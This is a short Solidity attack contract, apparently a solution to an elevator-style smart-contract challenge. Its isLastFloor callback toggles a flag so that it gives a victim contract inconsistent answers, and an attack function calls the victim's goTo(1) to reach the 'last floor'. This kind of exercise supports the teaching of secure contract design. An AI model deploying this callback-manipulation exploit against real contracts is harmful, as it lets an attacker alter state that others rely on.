pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract AttackBuilding is Building {
    bool public flag;

    function isLastFloor(uint) external override returns(bool) {
        flag = !flag;
        return !flag;
    }

    function attack(address _victim) public {
        bytes memory payload = abi.encodeWithSignature("goTo(uint256)", 1);
        _victim.call(payload);
    }
}